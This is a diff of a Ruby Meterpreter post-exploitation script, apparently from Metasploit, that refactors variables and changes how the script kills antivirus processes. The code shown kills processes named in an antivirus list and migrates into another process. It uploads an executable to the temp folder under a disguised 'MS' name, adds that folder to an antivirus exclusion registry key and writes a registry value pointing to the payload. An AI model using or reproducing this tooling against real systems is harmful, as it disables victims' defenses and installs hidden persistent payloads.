@@ -25,22 +25,22 @@ def usage()
 	print_line(@@exec_opts.usage)
 end
 
-$path = ""
-$location = ""
+@path = ""
+@location = ""
 
 def upload(session,file,trgloc)
 	if not ::File.exists?(file)
 		raise "File to Upload does not exists!"
 	else
-		$location = session.fs.file.expand_path("%TEMP%")
+		@location = session.fs.file.expand_path("%TEMP%")
 		begin
 			ext = file.scan(/\S*(.exe)/i)
 			if ext.join == ".exe"
-				fileontrgt = "#{$location}\\MS#{rand(100)}.exe"
+				fileontrgt = "#{@location}\\MS#{rand(100)}.exe"
 			else
-				fileontrgt = "#{$location}\\MS#{rand(100)}#{ext}"
+				fileontrgt = "#{@location}\\MS#{rand(100)}#{ext}"
 			end
-			$path = fileontrgt
+			@path = fileontrgt
 			print_status("Uploading #{file}....")
 			session.fs.file.upload_file("#{fileontrgt}","#{file}")
 			print_status("Uploaded as #{fileontrgt}")
@@ -88,7 +88,8 @@ avs = %W{
 
 av = 0
 
-client.sys.process.get_processes().each do |x|
+plist = client.sys.process.get_processes()
+plist.each do |x|
 	if (avs.index(x['name'].downcase))
 		av = av + 1
 	end
@@ -118,19 +119,21 @@ end
 print_status("Migrating into process ID #{target_pid}")
 client.core.migrate(target_pid)
 
+target_pid = nil
+
 if killonly == 1
-	client.sys.process.get_processes().each do |x|
-		if (avs.index(x['name'].downcase))
-			print_status("Killing off #{x['name']}...")
-			client.sys.process.kill(x['pid'])
-		end
+	avs.each do |x|
+		# Get the target process pid
+		target_pid = client.sys.process[x]
+		print_status("Killing off #{x}...")
+		client.sys.process.kill(target_pid)
 	end
 else
-	client.sys.process.get_processes().each do |x|
-		if (avs.index(x['name'].downcase))
-			print_status("Killing off #{x['name']}...")
-			client.sys.process.kill(x['pid'])
-		end
+	avs.each do |x|
+		# Get the target process pid
+		target_pid = client.sys.process[x]
+		print_status("Killing off #{x}...")
+		client.sys.process.kill(target_pid)
 	end
 
 	# Upload it
@@ -182,7 +185,7 @@ else
 
 	# Add executable to excluded item folder
 	value = "ExcludedItem_0"
-	data = "3|3|" + $location
+	data = "3|3|" + @location
 	type = "REG_SZ"
 	open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
 	open_key.set_value(value, client.sys.registry.type2str(type), data)
@@ -193,7 +196,7 @@ else
 	# Split the key into its parts
 	root_key, base_key = client.sys.registry.splitkey(key)
 	value = "MS"
-	data = $path
+	data = @path
 	open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE)
 	open_key.set_value(value, client.sys.registry.type2str(type), data)
 	print_status("Successful set #{key} -> #{value} to #{data}.")
